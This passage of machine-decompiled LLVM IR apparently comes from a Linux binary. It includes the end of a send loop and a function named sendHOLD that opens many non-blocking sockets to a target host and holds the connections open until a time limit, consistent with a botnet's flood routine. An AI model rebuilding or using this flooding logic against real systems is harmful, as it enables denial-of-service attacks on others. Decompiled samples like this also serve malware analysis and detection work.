  %v1_804c4e0 = load i32, i32* @esp, align 4
  %v2_804c4e0 = inttoptr i32 %v1_804c4e0 to i32*
  store i32 %v0_804c4e0, i32* %v2_804c4e0, align 4
  %v0_804c4e3 = load i32, i32* %stack_var_-200, align 4
  %v1_804c4e3 = load i32, i32* %stack_var_-196, align 4
  %v3_804c4e3 = load i32, i32* %stack_var_-188, align 4
  %v4_804c4e3 = call i32 @__libc_send(i32 %v0_804c4e3, i32 %v1_804c4e3, i32 %stack_var_-192.140, i32 %v3_804c4e3)
  store i32 %v4_804c4e3, i32* %eax.global-to-local, align 4
  %v10_804c4e8 = icmp eq i32 %v4_804c4e3, -1
  %v1_804c4eb = icmp eq i1 %v10_804c4e8, false
  br i1 %v1_804c4eb, label %dec_label_pc_804c515, label %dec_label_pc_804c4ed

dec_label_pc_804c4ed:                             ; preds = %dec_label_pc_804c4ad
  %v0_804c4ed = load i32, i32* %stack_var_-200, align 4
  %v1_804c4ed = call i32 @__errno_location(i32 %v0_804c4ed)
  store i32 %v1_804c4ed, i32* %eax.global-to-local, align 4
  %v1_804c4f2 = inttoptr i32 %v1_804c4ed to i32*
  %v2_804c4f2 = load i32, i32* %v1_804c4f2, align 4
  store i32 %v2_804c4f2, i32* %eax.global-to-local, align 4
  %v9_804c4f4 = icmp eq i32 %v2_804c4f2, 11
  br i1 %v9_804c4f4, label %dec_label_pc_804c515, label %dec_label_pc_804c4f9

dec_label_pc_804c4f9:                             ; preds = %dec_label_pc_804c4ed
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  %v5_804c4ff = load i32, i32* %v4_804c4c6, align 8
  store i32 %v5_804c4ff, i32* %eax.global-to-local, align 4
  %v1_804c502 = load i32, i32* @esp, align 4
  %v2_804c502 = inttoptr i32 %v1_804c502 to i32*
  store i32 %v5_804c4ff, i32* %v2_804c502, align 4
  %v0_804c505 = load i32, i32* %stack_var_-200, align 4
  %v1_804c505 = call i32 @__libc_close(i32 %v0_804c505)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804c1ff, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c281, align 4
  br label %dec_label_pc_804c515

dec_label_pc_804c515:                             ; preds = %dec_label_pc_804c2a9, %dec_label_pc_804c4ed, %dec_label_pc_804c4ad, %dec_label_pc_804c485, %dec_label_pc_804c48f, %dec_label_pc_804c475, %dec_label_pc_804c454, %dec_label_pc_804c36b, %dec_label_pc_804c355, %dec_label_pc_804c4f9
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804c485 ], [ 10000, %dec_label_pc_804c48f ], [ 10000, %dec_label_pc_804c475 ], [ 10000, %dec_label_pc_804c454 ], [ %stack_var_-192.140, %dec_label_pc_804c4ad ], [ %stack_var_-192.140, %dec_label_pc_804c4ed ], [ %stack_var_-192.140, %dec_label_pc_804c4f9 ], [ %stack_var_-192.140, %dec_label_pc_804c355 ], [ %stack_var_-192.140, %dec_label_pc_804c36b ], [ %stack_var_-192.140, %dec_label_pc_804c2a9 ]
  %v4_804c515 = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804c515, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804c515, %v2_804c187
  br i1 %exitcond, label %dec_label_pc_804c524, label %dec_label_pc_804c27b

dec_label_pc_804c524:                             ; preds = %dec_label_pc_804c518.preheader, %dec_label_pc_804c515, %dec_label_pc_804c1c5
  %stack_var_-192.2 = phi i32 [ %tmp2, %dec_label_pc_804c1c5 ], [ %stack_var_-192.2, %dec_label_pc_804c518.preheader ], [ %stack_var_-192.0, %dec_label_pc_804c515 ]
  %stack_var_-36.0 = phi i32 [ %tmp6, %dec_label_pc_804c1c5 ], [ 0, %dec_label_pc_804c518.preheader ], [ %v2_804c187, %dec_label_pc_804c515 ]
  %v0_804c524 = load i32, i32* @esp, align 4
  %v1_804c524 = inttoptr i32 %v0_804c524 to i32*
  store i32 0, i32* %v1_804c524, align 4
  %v1_804c52b = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804c52b = call i32 @__GI_time(i32* %v1_804c52b)
  store i32 %v2_804c52b, i32* %eax.global-to-local, align 4
  %v5_804c533 = icmp slt i32 %v2_804c52b, %v5_804c264
  br i1 %v5_804c533, label %dec_label_pc_804c518.preheader, label %dec_label_pc_804c539

dec_label_pc_804c518.preheader:                   ; preds = %dec_label_pc_804c524
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804c51b38, label %dec_label_pc_804c27b, label %dec_label_pc_804c524

dec_label_pc_804c539:                             ; preds = %dec_label_pc_804c524, %entry
  %v0_804c545 = phi i32 [ %v3_804c1b7, %entry ], [ %v2_804c52b, %dec_label_pc_804c524 ]
  %v2_804c542 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804c542, i32* @ebx, align 4
  store i32 %v0_804c169, i32* @edi, align 4
  ret i32 %v0_804c545

; uselistorder directives
  uselistorder i32 %v4_804c515, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v5_804c3fd, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804c3ab, { 1, 0 }
  uselistorder i32* %v4_804c39a, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804c281, { 6, 1, 0, 2, 3, 4, 5, 7 }
  uselistorder i8* %v5_804c281, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.140, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge41, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 0, 1 }
  uselistorder i32 %v1_804c232, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v2_804c21c, { 1, 0 }
  uselistorder i32 %v2_804c1ff, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804c195, { 1, 0 }
  uselistorder i32 %v2_804c187, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804c179, { 1, 0, 2 }
  uselistorder i32 %v12_804c16b, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-200, { 4, 2, 0, 3, 1, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 20, 1, 44, 0, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 14, 15, 13, 16, 17, 22, 18, 19, 21, 23, 24, 26, 25, 29, 27, 28, 30, 31, 35, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 45, 47, 46, 48, 50, 49, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 6, 12, 11, 10, 9, 5, 4, 8, 7, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c515, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804c549 = load i32, i32* @edi, align 4
  %v0_804c54a = load i32, i32* @ebx, align 4
  store i32 %v0_804c54a, i32* %stack_var_-12, align 4
  %v12_804c54b = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v12_804c54b, i32* %eax.global-to-local, align 4
  %v1_804c559 = call i32 @getdtablesize(i32 %v12_804c54b)
  store i32 %v1_804c559, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804c559, 0
  %v2_804c562 = zext i1 %tmp to i32
  %v2_804c565 = add i32 %v2_804c562, %v1_804c559
  %v2_804c567 = sdiv i32 %v2_804c565, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804c575 = urem i32 %arg2, 65536
  store i32 %v1_804c575, i32* %eax.global-to-local, align 4
  store i32 %v1_804c575, i32* %stack_var_-252, align 4
  %v1_804c57b = trunc i32 %arg2 to i16
  %v2_804c57b = call i32 @htons(i16 %v1_804c57b)
  %v2_804c587 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-252, align 4
  %v3_804c597 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804c597, i32* %eax.global-to-local, align 4
  %v1_804c59c = icmp eq i32 %v3_804c597, 0
  br i1 %v1_804c59c, label %dec_label_pc_804c5a5, label %dec_label_pc_804c960

dec_label_pc_804c5a5:                             ; preds = %entry
  %v2_804c5bb = mul i32 %v2_804c567, 8
  %v1_804c5c1 = add i32 %v2_804c5bb, 30
  %v2_804c5c4 = and i32 %v1_804c5c1, -16
  %v0_804c5ca = load i32, i32* @esp, align 4
  %v2_804c5ca = sub i32 %v0_804c5ca, %v2_804c5c4
  %v1_804c5dc = add i32 %v2_804c5ca, 35
  %v2_804c5df = and i32 %v1_804c5dc, -16
  %v2_804c5fc = mul i32 %v2_804c567, 5
  store i32 %v2_804c5fc, i32* %edx.global-to-local, align 4
  %v1_804c602 = inttoptr i32 %v2_804c5df to i8*
  store i32 %v2_804c5df, i32* @edi, align 4
  %v1_804c607 = and i32 %v1_804c5dc, -256
  store i32 %v1_804c607, i32* %eax.global-to-local, align 4
  %v5_804c609 = call i8* @_memset(i8* %v1_804c602, i32 %v1_804c607, i32 %v2_804c5fc)
  %v0_804c60b = load i32, i32* @esp, align 4
  %v1_804c60b = inttoptr i32 %v0_804c60b to i32*
  store i32 1024, i32* %v1_804c60b, align 4
  %v1_804c612 = call i32 @malloc(i32 %v2_804c5df)
  store i32 %v1_804c612, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804c624 = load i32, i32* @esp, align 4
  %v2_804c624 = add i32 %v1_804c624, 8
  %v3_804c624 = inttoptr i32 %v2_804c624 to i32*
  store i32 1024, i32* %v3_804c624, align 4
  %v0_804c628 = load i32, i32* @esp, align 4
  %v1_804c628 = add i32 %v0_804c628, 4
  %v2_804c628 = inttoptr i32 %v1_804c628 to i32*
  store i32 0, i32* %v2_804c628, align 4
  %v0_804c630 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c630 = load i32, i32* @esp, align 4
  %v2_804c630 = inttoptr i32 %v1_804c630 to i32*
  store i32 %v0_804c630, i32* %v2_804c630, align 4
  %v3_804c633 = inttoptr i32 %v1_804c612 to i8*
  %v4_804c633 = call i32 @__GI_memset(i8* %v3_804c633, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804c633, i32* %eax.global-to-local, align 4
  %v0_804c638 = load i32, i32* @esp, align 4
  %v1_804c638 = inttoptr i32 %v0_804c638 to i32*
  store i32 0, i32* %v1_804c638, align 4
  %v1_804c63f = inttoptr i32 %v1_804c612 to i32*
  %v2_804c63f = call i32 @__GI_time(i32* %v1_804c63f)
  %v5_804c644 = add i32 %v2_804c63f, %arg3
  store i32 %v5_804c644, i32* %eax.global-to-local, align 4
  %v3_804c661 = or i32 %v2_804c5df, 4
  %v2_804c765 = ptrtoint i32* %stack_var_-196 to i32
  %tmp33 = bitcast i32* %stack_var_-196 to i8*
  %v2_804c7b6 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804c7fe = ptrtoint i32* %stack_var_-208 to i32
  %v2_804c808 = ptrtoint i32* %stack_var_-212 to i32
  %v16_804c94240 = icmp sgt i32 %v2_804c565, 1
  br label %dec_label_pc_804c94b

dec_label_pc_804c65b:                             ; preds = %dec_label_pc_804c93f.preheader, %dec_label_pc_804c93c
  %storemerge42 = phi i32 [ %v4_804c93c, %dec_label_pc_804c93c ], [ 0, %dec_label_pc_804c93f.preheader ]
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804c5df, i32* %edx.global-to-local, align 4
  %v2_804c661 = mul i32 %storemerge42, 8
  %v4_804c661 = add i32 %v2_804c661, %v3_804c661
  %v5_804c661 = inttoptr i32 %v4_804c661 to i8*
  %v6_804c661 = load i8, i8* %v5_804c661, align 4
  %v7_804c661 = zext i8 %v6_804c661 to i32
  store i32 %v7_804c661, i32* %eax.global-to-local, align 4
  %v8_804c66f = icmp eq i8 %v6_804c661, 0
  %v12_804c66f = icmp eq i8 %v6_804c661, 1
  br i1 %v12_804c66f, label %dec_label_pc_804c75b, label %dec_label_pc_804c67c

dec_label_pc_804c67c:                             ; preds = %dec_label_pc_804c65b
  %v12_804c67c = icmp eq i8 %v6_804c661, 2
  br i1 %v12_804c67c, label %dec_label_pc_804c890, label %dec_label_pc_804c689

dec_label_pc_804c689:                             ; preds = %dec_label_pc_804c67c
  br i1 %v8_804c66f, label %dec_label_pc_804c697, label %dec_label_pc_804c93c

dec_label_pc_804c697:                             ; preds = %dec_label_pc_804c689
  store i32 %storemerge42, i32* @ebx, align 4
  %v0_804c69a = load i32, i32* @esp, align 4
  %v1_804c69a = add i32 %v0_804c69a, 8
  %v2_804c69a = inttoptr i32 %v1_804c69a to i32*
  store i32 0, i32* %v2_804c69a, align 4
  %v0_804c6a2 = load i32, i32* @esp, align 4
  %v1_804c6a2 = add i32 %v0_804c6a2, 4
  %v2_804c6a2 = inttoptr i32 %v1_804c6a2 to i32*
  store i32 1, i32* %v2_804c6a2, align 4
  %v0_804c6aa = load i32, i32* @esp, align 4
  %v1_804c6aa = inttoptr i32 %v0_804c6aa to i32*
  store i32 2, i32* %v1_804c6aa, align 4
  %v3_804c6b1 = call i32 @socket(i32 %v7_804c661, i32 %v12_804c54b, i32 ptrtoint (i32* @0 to i32))
  %v2_804c6bb = load i32, i32* @ebx, align 4
  %v3_804c6bb = mul i32 %v2_804c6bb, 8
  %v4_804c6bb = add i32 %v3_804c6bb, %v2_804c5df
  %v5_804c6bb = inttoptr i32 %v4_804c6bb to i32*
  store i32 %v3_804c6b1, i32* %v5_804c6bb, align 8
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v3_804c6c4 = add i32 %v2_804c661, %v2_804c5df
  %v4_804c6c4 = inttoptr i32 %v3_804c6c4 to i32*
  %v5_804c6c4 = load i32, i32* %v4_804c6c4, align 8
  store i32 %v5_804c6c4, i32* %eax.global-to-local, align 4
  %v0_804c6c7 = load i32, i32* @esp, align 4
  %v1_804c6c7 = add i32 %v0_804c6c7, 8
  %v2_804c6c7 = inttoptr i32 %v1_804c6c7 to i32*
  store i32 0, i32* %v2_804c6c7, align 4
  %v0_804c6cf = load i32, i32* @esp, align 4
  %v1_804c6cf = add i32 %v0_804c6cf, 4
  %v2_804c6cf = inttoptr i32 %v1_804c6cf to i32*
  store i32 3, i32* %v2_804c6cf, align 4
  %v0_804c6d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6d7 = load i32, i32* @esp, align 4
  %v2_804c6d7 = inttoptr i32 %v1_804c6d7 to i32*
  store i32 %v0_804c6d7, i32* %v2_804c6d7, align 4
  %v3_804c6da = call i32 @__libc_fcntl(i32 %v7_804c661, i32 %v12_804c54b, i32 ptrtoint (i32* @0 to i32))
  %v1_804c6e1 = or i32 %v3_804c6da, 2048
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c6ed = load i32, i32* %v4_804c6c4, align 8
  store i32 %v5_804c6ed, i32* %eax.global-to-local, align 4
  %v1_804c6f0 = load i32, i32* @esp, align 4
  %v2_804c6f0 = add i32 %v1_804c6f0, 8
  %v3_804c6f0 = inttoptr i32 %v2_804c6f0 to i32*
  store i32 %v1_804c6e1, i32* %v3_804c6f0, align 4
  %v0_804c6f4 = load i32, i32* @esp, align 4
  %v1_804c6f4 = add i32 %v0_804c6f4, 4
  %v2_804c6f4 = inttoptr i32 %v1_804c6f4 to i32*
  store i32 4, i32* %v2_804c6f4, align 4
  %v0_804c6fc = load i32, i32* %eax.global-to-local, align 4
  %v1_804c6fc = load i32, i32* @esp, align 4
  %v2_804c6fc = inttoptr i32 %v1_804c6fc to i32*
  store i32 %v0_804c6fc, i32* %v2_804c6fc, align 4
  %v3_804c6ff = call i32 @__libc_fcntl(i32 %v7_804c661, i32 %v12_804c54b, i32 ptrtoint (i32* @0 to i32))
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c70d = load i32, i32* %v4_804c6c4, align 8
  store i32 %v5_804c70d, i32* %eax.global-to-local, align 4
  %v0_804c710 = load i32, i32* @esp, align 4
  %v1_804c710 = add i32 %v0_804c710, 8
  %v2_804c710 = inttoptr i32 %v1_804c710 to i32*
  store i32 16, i32* %v2_804c710, align 4
  %v1_804c718 = load i32, i32* @esp, align 4
  %v2_804c718 = add i32 %v1_804c718, 4
  %v3_804c718 = inttoptr i32 %v2_804c718 to i32*
  store i32 %v2_804c587, i32* %v3_804c718, align 4
  %v0_804c71c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c71c = load i32, i32* @esp, align 4
  %v2_804c71c = inttoptr i32 %v1_804c71c to i32*
  store i32 %v0_804c71c, i32* %v2_804c71c, align 4
  %v3_804c71f = call i32 @__libc_connect(i32 %v7_804c661, i32 %v12_804c54b, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804c71f, i32* %eax.global-to-local, align 4
  %v10_804c724 = icmp eq i32 %v3_804c71f, -1
  %v1_804c727 = icmp eq i1 %v10_804c724, false
  br i1 %v1_804c727, label %dec_label_pc_804c735, label %dec_label_pc_804c729

dec_label_pc_804c729:                             ; preds = %dec_label_pc_804c697
  %v1_804c729 = call i32 @__errno_location(i32 %v7_804c661)
  store i32 %v1_804c729, i32* %eax.global-to-local, align 4
  %v1_804c72e = inttoptr i32 %v1_804c729 to i32*
  %v2_804c72e = load i32, i32* %v1_804c72e, align 4
  store i32 %v2_804c72e, i32* %eax.global-to-local, align 4
  %v9_804c730 = icmp eq i32 %v2_804c72e, 115
  br i1 %v9_804c730, label %dec_label_pc_804c74b, label %dec_label_pc_804c735

dec_label_pc_804c735:                             ; preds = %dec_label_pc_804c729, %dec_label_pc_804c697
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804c5df, i32* %edx.global-to-local, align 4
  %v5_804c73b = load i32, i32* %v4_804c6c4, align 8
  store i32 %v5_804c73b, i32* %eax.global-to-local, align 4
  %v1_804c73e = load i32, i32* @esp, align 4
  %v2_804c73e = inttoptr i32 %v1_804c73e to i32*
  store i32 %v5_804c73b, i32* %v2_804c73e, align 4
  %v1_804c741 = call i32 @__libc_close(i32 %v7_804c661)
  store i32 %v1_804c741, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c74b:                             ; preds = %dec_label_pc_804c729
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804c661, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c75b:                             ; preds = %dec_label_pc_804c65b
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c765, i32* @edi, align 4
  %v5_804c76c = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v3_804c77a = add i32 %v2_804c661, %v2_804c5df
  %v4_804c77a = inttoptr i32 %v3_804c77a to i32*
  %v5_804c77a = load i32, i32* %v4_804c77a, align 8
  %v2_804c77f = udiv i32 %v5_804c77a, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c788 = load i32, i32* %v4_804c77a, align 8
  %v1_804c78b = urem i32 %v5_804c788, 32
  store i32 %v1_804c78b, i32* %eax.global-to-local, align 4
  %v0_804c78e = load i32, i32* @ebp, align 4
  %v2_804c78e = mul nuw nsw i32 %v2_804c77f, 4
  %v3_804c78e = add nsw i32 %v2_804c78e, -192
  %v4_804c78e = add i32 %v3_804c78e, %v0_804c78e
  %v5_804c78e = inttoptr i32 %v4_804c78e to i32*
  %v6_804c78e = load i32, i32* %v5_804c78e, align 4
  %v9_804c78e = shl i32 1, %v1_804c78b
  %v12_804c78e = or i32 %v6_804c78e, %v9_804c78e
  store i32 %v12_804c78e, i32* %v5_804c78e, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c7b0 = load i32, i32* %v4_804c77a, align 8
  %v1_804c7b3 = add i32 %v5_804c7b0, 1
  store i32 %v1_804c7b3, i32* %edx.global-to-local, align 4
  %v1_804c7bc = load i32, i32* @esp, align 4
  %v2_804c7bc = add i32 %v1_804c7bc, 16
  %v3_804c7bc = inttoptr i32 %v2_804c7bc to i32*
  store i32 %v2_804c7b6, i32* %v3_804c7bc, align 4
  %v0_804c7c0 = load i32, i32* @esp, align 4
  %v1_804c7c0 = add i32 %v0_804c7c0, 12
  %v2_804c7c0 = inttoptr i32 %v1_804c7c0 to i32*
  store i32 0, i32* %v2_804c7c0, align 4
  store i32 %v2_804c765, i32* %eax.global-to-local, align 4
  %v1_804c7ce = load i32, i32* @esp, align 4
  %v2_804c7ce = add i32 %v1_804c7ce, 8
  %v3_804c7ce = inttoptr i32 %v2_804c7ce to i32*
  store i32 %v2_804c765, i32* %v3_804c7ce, align 4
  %v0_804c7d2 = load i32, i32* @esp, align 4
  %v1_804c7d2 = add i32 %v0_804c7d2, 4
  %v2_804c7d2 = inttoptr i32 %v1_804c7d2 to i32*
  store i32 0, i32* %v2_804c7d2, align 4
  %v0_804c7da = load i32, i32* %edx.global-to-local, align 4
  %v1_804c7da = load i32, i32* @esp, align 4
  %v2_804c7da = inttoptr i32 %v1_804c7da to i32*
  store i32 %v0_804c7da, i32* %v2_804c7da, align 4
  %v0_804c7dd = load i32, i32* %stack_var_-204, align 4
  %v2_804c7dd = load i32, i32* %stack_var_-196, align 4
  %v5_804c7dd = call i32 @__libc_select(i32 %v0_804c7dd, i32 10000, i32 %v2_804c7dd, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804c7dd, i32* %eax.global-to-local, align 4
  %v12_804c7e5 = icmp eq i32 %v5_804c7dd, 1
  %v1_804c7e9 = icmp eq i1 %v12_804c7e5, false
  br i1 %v1_804c7e9, label %dec_label_pc_804c865, label %dec_label_pc_804c7eb

dec_label_pc_804c7eb:                             ; preds = %dec_label_pc_804c75b
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c7fb = load i32, i32* %v4_804c77a, align 8
  store i32 %v5_804c7fb, i32* %edx.global-to-local, align 4
  %v1_804c804 = load i32, i32* @esp, align 4
  %v2_804c804 = add i32 %v1_804c804, 16
  %v3_804c804 = inttoptr i32 %v2_804c804 to i32*
  store i32 %v2_804c7fe, i32* %v3_804c804, align 4
  store i32 %v2_804c808, i32* %eax.global-to-local, align 4
  %v1_804c80e = load i32, i32* @esp, align 4
  %v2_804c80e = add i32 %v1_804c80e, 12
  %v3_804c80e = inttoptr i32 %v2_804c80e to i32*
  store i32 %v2_804c808, i32* %v3_804c80e, align 4
  %v0_804c812 = load i32, i32* @esp, align 4
  %v1_804c812 = add i32 %v0_804c812, 8
  %v2_804c812 = inttoptr i32 %v1_804c812 to i32*
  store i32 4, i32* %v2_804c812, align 4
  %v0_804c81a = load i32, i32* @esp, align 4
  %v1_804c81a = add i32 %v0_804c81a, 4
  %v2_804c81a = inttoptr i32 %v1_804c81a to i32*
  store i32 1, i32* %v2_804c81a, align 4
  %v0_804c822 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c822 = load i32, i32* @esp, align 4
  %v2_804c822 = inttoptr i32 %v1_804c822 to i32*
  store i32 %v0_804c822, i32* %v2_804c822, align 4
  %v0_804c825 = load i32, i32* %stack_var_-208, align 4
  %v1_804c825 = load i32, i32* %stack_var_-204, align 4
  %v3_804c825 = load i32, i32* %stack_var_-196, align 4
  %v5_804c825 = call i32 @getsockopt(i32 %v0_804c825, i32 %v1_804c825, i32 10000, i32 %v3_804c825, i32 ptrtoint (i32* @0 to i32))
  %v3_804c82a = load i32, i32* %stack_var_-212, align 4
  %v1_804c830 = icmp eq i32 %v3_804c82a, 0
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  br i1 %v1_804c830, label %dec_label_pc_804c855, label %dec_label_pc_804c834

dec_label_pc_804c834:                             ; preds = %dec_label_pc_804c7eb
  %v5_804c83a = load i32, i32* %v4_804c77a, align 8
  store i32 %v5_804c83a, i32* %eax.global-to-local, align 4
  %v1_804c83d = load i32, i32* @esp, align 4
  %v2_804c83d = inttoptr i32 %v1_804c83d to i32*
  store i32 %v5_804c83a, i32* %v2_804c83d, align 4
  %v0_804c840 = load i32, i32* %stack_var_-208, align 4
  %v1_804c840 = call i32 @__libc_close(i32 %v0_804c840)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c661, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c855:                             ; preds = %dec_label_pc_804c7eb
  store i8 2, i8* %v5_804c661, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c865:                             ; preds = %dec_label_pc_804c75b
  %v13_804c865 = icmp eq i32 %v5_804c7dd, -1
  %v1_804c869 = icmp eq i1 %v13_804c865, false
  br i1 %v1_804c869, label %dec_label_pc_804c93c, label %dec_label_pc_804c86f

dec_label_pc_804c86f:                             ; preds = %dec_label_pc_804c865
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c875 = load i32, i32* %v4_804c77a, align 8
  store i32 %v5_804c875, i32* %eax.global-to-local, align 4
  %v1_804c878 = load i32, i32* @esp, align 4
  %v2_804c878 = inttoptr i32 %v1_804c878 to i32*
  store i32 %v5_804c875, i32* %v2_804c878, align 4
  %v1_804c87b = call i32 @__libc_close(i32 %v5_804c7dd)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804c661, align 4
  br label %dec_label_pc_804c93c

dec_label_pc_804c890:                             ; preds = %dec_label_pc_804c67c
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804c765, i32* @edi, align 4
  %v5_804c8a1 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v3_804c8af = add i32 %v2_804c661, %v2_804c5df
  %v4_804c8af = inttoptr i32 %v3_804c8af to i32*
  %v5_804c8af = load i32, i32* %v4_804c8af, align 8
  %v2_804c8b4 = udiv i32 %v5_804c8af, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c8bd = load i32, i32* %v4_804c8af, align 8
  %v1_804c8c0 = urem i32 %v5_804c8bd, 32
  store i32 %v1_804c8c0, i32* %eax.global-to-local, align 4
  %v0_804c8c3 = load i32, i32* @ebp, align 4
  %v2_804c8c3 = mul nuw nsw i32 %v2_804c8b4, 4
  %v3_804c8c3 = add nsw i32 %v2_804c8c3, -192
  %v4_804c8c3 = add i32 %v3_804c8c3, %v0_804c8c3
  %v5_804c8c3 = inttoptr i32 %v4_804c8c3 to i32*
  %v6_804c8c3 = load i32, i32* %v5_804c8c3, align 4
  %v9_804c8c3 = shl i32 1, %v1_804c8c0
  %v12_804c8c3 = or i32 %v6_804c8c3, %v9_804c8c3
  store i32 %v12_804c8c3, i32* %v5_804c8c3, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804c5df, i32* %eax.global-to-local, align 4
  %v5_804c8e5 = load i32, i32* %v4_804c8af, align 8
  %v1_804c8e8 = add i32 %v5_804c8e5, 1
  store i32 %v1_804c8e8, i32* %edx.global-to-local, align 4
  %v1_804c8f1 = load i32, i32* @esp, align 4
  %v2_804c8f1 = add i32 %v1_804c8f1, 16
  %v3_804c8f1 = inttoptr i32 %v2_804c8f1 to i32*
  store i32 %v2_804c7b6, i32* %v3_804c8f1, align 4
  store i32 %v2_804c765, i32* %eax.global-to-local, align 4
